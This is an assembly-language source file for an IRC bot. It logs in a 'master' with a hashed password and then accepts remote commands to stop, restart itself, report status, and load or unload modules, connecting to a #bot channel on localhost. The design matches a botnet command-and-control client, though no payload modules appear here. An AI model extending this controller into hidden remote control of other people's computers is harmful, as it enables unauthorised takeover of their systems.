;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc

;-----------------------------------------------------------------------
includes    ..\common\misc.inc, ..\common\xcrcsz.inc, misc.asm, modules.asm, irc.asm

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
irc_command proc dwsocket, lpszuser, lpszreply, lpszcmd, lpszarguments
    local   dwSocket, szbuffer1[1024]:byte
    pushad

    ;--------------------------------------------------------------
    invoke  get_token, addr szbuffer1, lpszarguments, ' ', 0, FALSE
    invoke  xcrcsz, addr szbuffer1
    .if     eax == SWITCH_VERBOSE_MODE
        m2m     dwSocket, dwsocket
    .else
        and     dwSocket, 0
    .endif

    ;--------------------------------------------------------------
    invoke  xcrcsz, lpszcmd
    .if     eax == DOT_LOGIN_COMMAND

        invoke  xcrcsz, lpszuser
        .if     eax != bot_info.dwmaster || !bot_info.dwmaster

            invoke  get_token, addr szbuffer1, lpszarguments, ' ', 1, FALSE
            invoke  xcrcsz, addr szbuffer1
            .if     eax == dwMASTER_PASSWORD
                
                invoke  xcrcsz, lpszuser
                mov     bot_info.dwmaster, eax

                invoke  send_msg, dwSocket, lpszreply, SADD("Wellcome home, sir", EOL)
            
            .endif
        
        .else
            invoke  send_msg, dwSocket, lpszreply, SADD("Already logged.")

        .endif

    .else
        mov     ebx, eax
        invoke  xcrcsz, lpszuser
        .if     eax == bot_info.dwmaster
            
            switch  ebx
                case    DOT_DIE_COMMAND || eax == DOT_RESTART_COMMAND

                    .if     eax == DOT_DIE_COMMAND
                        
                        invoke  send_msg, dwSocket, lpszreply, SADD("I'm feeling sleeply anyways U_U", EOL)

                    .else

                        invoke  send_msg, dwSocket, lpszreply, SADD("brb, sir", EOL)

                        invoke  GetModuleFileName, NULL, addr szbuffer1, sizeof szbuffer1
                        invoke  WinExec, addr szbuffer1, NULL
                    
                    .endif

                    invoke  closesocket, dwsocket
                    invoke  WSACleanup
                    invoke  ExitProcess, 0

                case    DOT_STATUS_COMMAND

                    invoke  print_status, addr szbuffer1, addr bot_info
                    invoke  send_msg, dwSocket, lpszreply, addr szbuffer1

                case    DOT_MODULES_COMMAND
                
                    invoke  print_modules, dwSocket, lpszreply, addr bot_info

                case    DOT_UNLOADM_COMMAND
            
                    invoke  unload_module, dwSocket, lpszreply, lpszarguments, addr bot_info
            
                case    DOT_RELOADM_COMMAND

                    invoke  module_load, addr bot_info, addr bot_info.modules
                
            endsw

        .endif
        
    .endif
    ;--------------------------------------------------------------

    popad
    ret
irc_command endp 

;-----------------------------------------------------------------------
start:
    invoke  GetSystemTime, addr bot_info.sSystemTime
    invoke  WSAStartup, 202h, addr bot_info.WSAData   
    
    ;mov     szusername_size, sizeof bot_info.szusername
    ;invoke  GetUserName, addr bot_info.szusername, addr szusername_size
    invoke  szCopy, SADD('bot_1'), addr bot_info.szusername
    invoke  module_load, addr bot_info, addr bot_info.modules
    invoke  irc_connect, SADD("#bot"), 0, addr bot_info.szusername, SADD("localhost"), 6667
    
    invoke  module_unload, addr bot_info.modules
    invoke  ExitProcess, 0
end start

;-----------------------------------------------------------------------
